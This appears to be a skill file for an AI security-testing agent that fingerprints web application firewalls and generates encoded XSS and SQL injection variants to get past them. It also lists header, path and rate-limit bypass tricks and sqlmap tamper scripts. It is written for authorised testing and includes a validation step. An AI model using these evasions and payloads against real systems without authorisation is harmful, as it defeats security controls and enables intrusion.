---
name: waf-bypass
description: WAF detection and targeted evasion. Use when a WAF is detected or payloads are blocked. Drives the waf-arsenal engine (fingerprint -> reflection context -> ranked variants) and the ModSecurity/CRS test oracle.
allowed-tools: Read, Grep, Glob, Bash
---
# WAF Detection and Bypass

Evasion is a scalpel, not a spray. A WAF that blocks your payload is a reachability
barrier to confirming a real bug; the job is to land the *specific* payload the sink
needs, not to fire every encoding at every parameter. The `waf-arsenal` engine does this
in three targeted steps, and the oracle lets you measure it against real rules.

## 1. Fingerprint the WAF
    wafw00f -a TARGET -o reports/raw/waf.json -f json     # quick external check
    ./scripts/waf-detect.sh TARGET                        # + origin-IP discovery
The arsenal also fingerprints the product from headers/cookies/body and feeds it into
variant selection, so you rarely call this separately.

## 2. Targeted variants (the engine)
Fingerprint + reflection-context probe + ranked, context-gated encoded variants:

    bash specter/scripts/waf-arsenal.sh run \
        --url https://TARGET/search --param q --payload "<script>alert(1)</script>"

Offline, when you already know the context/WAF (deterministic, no traffic):

    bash specter/scripts/waf-arsenal.sh encode \
        --payload "' OR 1=1-- -" --context sql_string,sql_error --waf modsecurity

Just find where input lands:

    bash specter/scripts/waf-arsenal.sh probe --url https://TARGET/search --param q

The catalogue holds ~24 techniques across 5 tiers (URL / double-URL / unicode / HTML
entity / mixed-case / SQL comment / whitespace / overlong-UTF8 / char-concat / tag-split
/ base64 ...). A technique only fires where it is meaningful for the observed reflection
context, so you never emit SQL comments into an HTML attribute. rank 0 is always your own
payload (reuse before you generate).

## 3. Measure against real CRS (the oracle)
Do not guess whether a technique beats a WAF -- measure it against the OWASP Core Rule
Set (rules you did not write), via podman:

    bash specter/scripts/waf-oracle.sh up
    bash specter/scripts/waf-oracle.sh measure \
        --payload "<script>alert(1)</script>" --context html_text --waf modsecurity
    bash specter/scripts/waf-oracle.sh down

`passed_waf` means the request cleared CRS. It does NOT mean the payload executed.

## Request-level tricks the encoder does not cover
- Header bypasses: `X-Forwarded-For: 127.0.0.1`, `X-Original-URL: /admin`, `X-HTTP-Method-Override: PUT`
- Path variation: `/api/v3/login` vs `/API/V3/Login` vs `/api/v3/login/` vs `/api/v3/login%00`
- Rate-limit bypass headers: `X-Forwarded-For`, `X-Originating-IP`, `X-Remote-IP`, `X-Client-IP`, `True-Client-IP`
- sqlmap tamper scripts (when driving sqlmap): `space2comment`, `randomcase`, `charunicodeencode`, `between`, `base64encode`, `apostrophemask`

## Validate & Promote
Findings from this skill are born `theoretical`. They do NOT enter a report or external
submission until promoted to `confirmed` with `scripts/validate-finding.sh`.

**Independent check for this class:** a bypass is only real if the underlying payload
FIRES at the origin (the SQLi/XSS/SSRF actually executes). A 200 (or `passed_waf`)
passing through the WAF is not a finding by itself -- pair it with the underlying class's
validation. Only `confirmed` findings ship; `validated` = reproduced but not yet
independently confirmed.

```bash
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent specter \
  --id SPE-NNN --state confirmed --method out-of-band \
  --negative-control "<the raw payload was blocked (403); the encoded variant reached the origin AND executed>" --by specter
```
